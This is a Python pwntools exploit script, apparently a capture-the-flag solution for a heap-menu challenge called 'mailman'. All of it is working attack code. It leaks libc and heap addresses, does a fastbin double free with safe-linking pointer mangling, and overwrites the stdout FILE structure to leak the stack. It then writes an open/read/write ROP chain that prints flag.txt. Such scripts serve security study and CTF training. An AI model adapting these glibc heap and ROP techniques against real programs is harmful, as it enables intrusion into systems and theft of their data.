#!/usr/bin/env python3

from pwn import *

elf = ELF("./vuln.elf")
s = process(elf.path, env={"LD_PRELOAD":"./libc.so.6"})
# s = remote("mailman.chal.imaginaryctf.org",1337)
libc = ELF("./libc.so.6")
g = ROP(libc)


def main():

	malloc(0, 0x458, b"AJAY")		# libc leak in future
	malloc(1, 0x178, b"AJAY")		# to prev won't merge
	for i in range(2,15):
	    malloc(i, 0x58, b"AJAY")	# tcache filling in future
	
	########## libc leak #########################################
	free(0)
	leak(0)
	libc_base = u64(s.recvline().strip().ljust(8,b'\x00')) - 0x219ce0
	log.info("The libc base of the process is " + hex(libc_base))
	libc.address = libc_base
	##############################################################

	for i in range(2,15):
	    free(i)						# tcache filling
	
	########## heap leak #########################################
	leak(2)
	heap_base = (u64(s.recvline().strip().ljust(8,b'\x00')) << 12 ) - 0x1000
	log.info("The heap base of the process is " + hex(heap_base))
	##############################################################

	free(13)
	free(14)
	free(13)						# double free at fastbin

	for i in range(2,9):
	    malloc(2, 0x58, b"1" * 0x7)							# perform to target to somewhere
	pointer = (heap_base + 0xb0) ^ ((heap_base >> 12)+2) 	# target is {heap_base + 0xb0}
	for i in range(0,3):
	    malloc(2, 0x58, p64(pointer))						# next will be at target
	
	pl = flat(
		p64(0),
		p64(libc_base + 0x21a780),	# _IO_2_1_stdout_
		p64(heap_base + 0xf0) * 8	# at end of this target
	)
	malloc(2, 0x58, pl)

	pl = flat(
		p64(0xfbad1800),
		p64(0),
		p64(libc.sym.environ),
		p64(0),
		p64(libc.sym.environ),
		p64(libc.sym.environ + 0x8),
		p64(libc.sym.environ + 0x8),
		p64(heap_base + 0x2a0),
		p64(heap_base + 0x2a0)
	)
	malloc(2, 0x68, pl)
	stack_leak = u64(s.recvuntil(b"\x7f").strip().ljust(8,b'\x00'))
	log.info("The stack leak of the process is " + hex(stack_leak))

	malloc(1, 0xc8, p64(0) + p64(stack_leak - 0x188))
	
	xchg = libc_base + 0x14a385
	pop_rdi = libc_base + g.find_gadget(['pop rdi', 'ret'])[0]
	pop_rsi = libc_base + g.find_gadget(['pop rsi', 'ret'])[0]
	pop_rdx = libc_base + g.find_gadget(['pop rdx', 'pop r12', 'ret'])[0]
	pop_rax = libc_base + g.find_gadget(['pop rax', 'ret'])[0]
	syscall = libc_base + g.find_gadget(['syscall', 'ret'])[0]
	rop = flat(
		b"./flag.txt".ljust(40, b"\x00"),
		p64(pop_rax),
		p64(2),
		p64(pop_rdi),
		p64(stack_leak - 0x188),
		p64(pop_rsi),
		p64(0),
		p64(pop_rdx),
		p64(0) * 2,
		p64(syscall),
		p64(xchg),
		p64(pop_rax),
		p64(0),
		p64(pop_rsi),
		p64(stack_leak),
		p64(pop_rdx),
		p64(0x60) * 2,
		p64(syscall),
		p64(pop_rax),
		p64(1),
		p64(pop_rdi),
		p64(1),
		p64(syscall)
	)
	malloc(1, len(rop), rop)

	s.interactive()


def malloc(index,size,content):
    s.sendlineafter(b">",b"1")
    s.sendlineafter(b"idx:",f"{index}".encode())
    s.sendlineafter(b"size:",f"{size}".encode())
    s.sendlineafter(b"content:",content)


def free(index):
    s.sendlineafter(b">",b"2")
    s.sendlineafter(b"idx:",f"{index}".encode())


def leak(index):
    s.sendlineafter(b">",b"3")
    s.sendlineafter(b"idx:",f"{index}".encode())


if __name__=="__main__":
	main()